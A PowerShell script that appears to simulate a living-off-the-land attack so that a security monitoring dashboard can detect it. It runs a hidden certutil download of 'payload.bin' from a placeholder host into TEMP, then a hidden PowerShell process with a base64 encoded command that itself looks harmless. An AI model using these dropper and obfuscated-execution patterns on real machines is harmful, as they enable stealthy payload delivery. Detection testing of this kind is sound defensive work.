Write-Host "💥 Starting Living-off-the-Land (LotL) Dual-Use Attack Simulation..." -ForegroundColor Yellow

# Phase 1: Benign Command
Write-Host "`n--- Phase 1: Benign System Utility Execution ---" -ForegroundColor Cyan
& cmd.exe /c "echo System baseline nominal"
Start-Sleep -Seconds 2

# Phase 2: Dual-Use CertUtil Dropper Emulation
Write-Host "`n--- Phase 2: Simulating CertUtil Remote Dropper Abuse ---" -ForegroundColor Yellow
$procInfo = New-Object System.Diagnostics.ProcessStartInfo
$procInfo.FileName = "certutil.exe"
$procInfo.Arguments = "-urlcache -split -f https://example.com/payload.bin $env:TEMP\dropped.bin"
$procInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
[System.Diagnostics.Process]::Start($procInfo) | Out-Null
Start-Sleep -Seconds 2

# Phase 3: Obfuscated Encoded PowerShell Execution
Write-Host "`n--- Phase 3: Simulating Hidden Obfuscated PowerShell Shellcode Ingress ---" -ForegroundColor Red
$psInfo = New-Object System.Diagnostics.ProcessStartInfo
$psInfo.FileName = "powershell.exe"
$psInfo.Arguments = "-WindowStyle Hidden -EncodedCommand ZQBjAGgAbwAgACcASABhAGMAawBlAGQAIwBwAGEAeQBsAG8AYQBkACcA"
$psInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
[System.Diagnostics.Process]::Start($psInfo) | Out-Null

Write-Host "`n✅ LotL Simulation Finished. Check Sentinel Terminal & SOC Dashboard." -ForegroundColor Green